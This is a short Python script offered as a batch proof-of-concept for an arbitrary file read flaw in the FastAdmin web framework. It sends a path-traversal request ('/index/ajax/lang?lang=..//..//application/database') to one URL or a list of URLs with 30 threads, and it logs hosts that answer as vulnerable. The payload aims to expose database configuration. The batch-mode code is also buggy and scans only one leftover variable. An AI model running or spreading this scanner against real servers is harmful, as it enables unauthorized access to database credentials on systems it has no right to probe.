import requests,json,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    text="""
███████╗ █████╗ ███████╗████████╗ █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗
██╔════╝██╔══██╗██╔════╝╚══██╔══╝██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║
█████╗  ███████║███████╗   ██║   ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║
██╔══╝  ██╔══██║╚════██║   ██║   ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║
██║     ██║  ██║███████║   ██║   ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║
╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
                                                                         
"""
    print(text)
def main():
    banner()
    parser=argparse.ArgumentParser(description='This is a batch POC for any file read vulnerability in the FastAdmin framework')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input your file path')
    parser.add_argument('-t','--txt',dest='txt',type=str,help='Please enter the text you want to output')
    arges=parser.parse_args()
    if arges.url and not arges.file:
        poc(arges.url,arges.txt)
    elif arges.file and not arges.url:
        url_line=[]
        with open(arges.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_line.append(url.strip())
        mp=Pool(30)
        mp.starmap(poc, [(url, arges.txt)])
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target,target1):
    api='/index/ajax/lang?lang=..//..//application/database'
    header={
        'Accept-Language':'zh-CN,zh;q=0.9',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept':'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate',
    }
    try:
        res1=requests.get(url=target+api,headers=header,timeout=5,verify=False)
        if res1.status_code==200:
            print(f"[+]{target} have loophole “{target+api}”")
            with open (target1,'a',encoding='utf-8') as f:
                f.write(target+'\n')
        else:
            print(f"[-]{target} not have loophole “{target+api}”")
    except:
        pass

if __name__=='__main__':
    main()
